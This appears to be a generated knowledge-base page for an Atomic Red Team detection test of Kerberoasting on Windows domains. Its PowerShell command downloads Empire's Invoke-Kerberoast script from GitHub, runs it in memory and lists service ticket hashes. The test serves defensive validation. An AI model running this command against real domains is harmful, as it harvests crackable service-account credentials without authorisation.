---
atomic_guid: "3f987809-3681-43c8-bcd8-b3ff3a28533a"
title: "Request for service tickets"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.003"
attack_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "3f987809-3681-43c8-bcd8-b3ff3a28533a"
  - "Request for service tickets"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Request for service tickets

This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1
The following are further sources and credits for this attack:
[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
when executed successfully , the test displays available services with their hashes. 
If the testing domain doesn't have any service principal name configured, there is no output

## Metadata

- Atomic GUID: 3f987809-3681-43c8-bcd8-b3ff3a28533a
- Technique: T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1558.003/T1558.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.003]]

## Dependencies

Computer must be domain joined

### Prerequisite Check

```text
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Write-Host Joining this computer to a domain must be done manually
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml)
